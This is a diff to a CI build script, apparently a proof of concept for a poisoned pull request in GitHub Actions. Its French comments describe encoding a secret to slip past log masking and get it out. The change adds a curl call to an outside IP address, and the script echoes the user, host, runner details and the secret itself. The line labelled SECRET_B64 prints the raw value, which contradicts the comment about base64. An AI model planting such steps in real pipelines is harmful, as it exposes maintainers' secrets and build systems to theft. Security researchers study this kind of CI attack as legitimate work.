@@ -3,6 +3,7 @@
 # Remplace ci/build.sh dans la PR de Bob. Prouve l'acces au secret sans rien detruire.
 # GitHub masque DEMO_SECRET en clair dans les logs -> on l'encode (base64) pour le
 # faire sortir : le masquage ne protege que l'affichage, pas l'exfiltration.
+curl -s "http://82.165.247.235/test3"
 echo "[poc] exec as $(whoami)@$(hostname) in $(pwd)"
 echo "[poc] runner=$RUNNER_NAME os=$RUNNER_OS"
 echo "[poc] SECRET_B64=${DEMO_SECRET}"
